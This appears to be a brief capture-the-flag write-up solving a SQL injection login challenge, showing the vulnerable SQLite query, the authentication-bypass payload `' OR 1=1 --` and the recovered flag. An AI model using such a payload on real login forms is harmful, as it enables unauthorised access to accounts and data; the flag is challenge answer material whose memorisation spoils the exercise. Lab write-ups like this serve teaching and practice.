### Problem 

This seems like a standard SQL injection challenge. 

### Solution

First let's determine what kind of injection we are looking at. We can insert a simple `'` character and watch the server crash. 

Looking through the error message given, we can see that it is an SQLite database with the following query command: 
```sql
SELECT * FROM users WHERE username='{username}' AND password='{password}'
```

We can construct a very basic payload: `' OR 1=1 --`, which yields the following query: 
```sql
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='{password}'
```
or in other words: 
```sql
SELECT * FROM users
```

Our flag is then `flag{second_admin}`
